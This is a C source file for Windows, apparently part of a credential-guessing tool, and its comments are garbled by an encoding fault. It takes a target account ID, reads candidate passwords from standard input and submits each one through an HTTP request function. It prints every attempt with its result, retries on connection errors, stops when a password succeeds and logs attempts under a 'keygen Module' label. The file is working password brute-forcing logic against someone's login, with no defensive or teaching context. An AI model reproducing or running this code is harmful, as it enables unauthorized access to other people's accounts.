#include <stdio.h>
#include <windows.h>
#include "httpModule.h"
#include "common.h"
#include "logfileModule.h"

extern char g_id[MAX_ID];
extern char savingFilename[MAX_PATH];

void processingStdin(char *_id)
{
	strcpy_s(g_id,MAX_ID, _id);	// id ����

	char pwdKey[MAX_PASSWORD];
	char writeBufferStr[LOGGING_BUFFER];	// �α�� ����
	int returnValue, resultQuery;
	int retryRemain;
	
	// �ݺ�Ƚ�� ��
	retryRemain = RETRY_CONNECT;
	do {
		if(RETRY_CONNECT == retryRemain) {	// ó�� �õ��� ����
			returnValue = scanf_s("%s", pwdKey, MAX_PASSWORD);
			if(EOF == returnValue) break;
		}		

		// ����
		resultQuery = requestPassword(pwdKey);
		printf("%s\t%d\n", pwdKey, resultQuery);	// ���

		if(TRUE == resultQuery || CONNECT_ERROR == resultQuery) return;	// ��� & ��Ʈ��ũ ����
		else if(EXCEPT_ERROR == resultQuery) {	// ���ӹ���(�Ϻ����� ����)
			if(--retryRemain > 0) {
				// �α� ���
				wsprintf(writeBufferStr,"[keygen Module]\r\n%s\t%d\r\n\r\n", pwdKey, resultQuery);	// �α׹��ڿ� ����
				writeLog(writeBufferStr);	// �α� ���
			}
			else {
				return;
				// retryRemain = RETRY_CONNECT;
			}
		}
		else {	// ���нÿ��� �ݺ�ȸ�� ����
			retryRemain = RETRY_CONNECT;
		}

		printf("");		// ���� ���
		
	}
	while (1);
}
void stdinEntry(char * id)
{
	SYSTEMTIME stCurrStartTime, stCurrEndTime;		// �ý��� �ð�
	GetLocalTime(&stCurrStartTime);		// ���� ���� �ð��� ���Ѵ�.
	wsprintf(savingFilename, "%s_%04d%02d%02d_%02d%02d.log", id, 
		stCurrStartTime.wYear, stCurrStartTime.wMonth, stCurrStartTime.wDay,
		stCurrStartTime.wHour, stCurrStartTime.wMinute);	// set to global var(�α������̸�)

	processingStdin(id);	// ó��

	GetLocalTime(&stCurrEndTime);	// ���� ���� �ð��� ���Ѵ�.

	// ���� ���
	printf("target ID : %s\n", id);
	printf("Start : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrStartTime.wMonth, stCurrStartTime.wDay,
		stCurrStartTime.wHour, stCurrStartTime.wMinute,stCurrStartTime.wSecond, stCurrStartTime.wMilliseconds);
	printf("End   : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrEndTime.wMonth,stCurrEndTime.wDay,
		stCurrEndTime.wHour, stCurrEndTime.wMinute,stCurrEndTime.wSecond,stCurrEndTime.wMilliseconds);
	WinExec("MessageBox.exe Terminated", SW_SHOWNORMAL);	// ���α׷� ����� ������ �޽���
}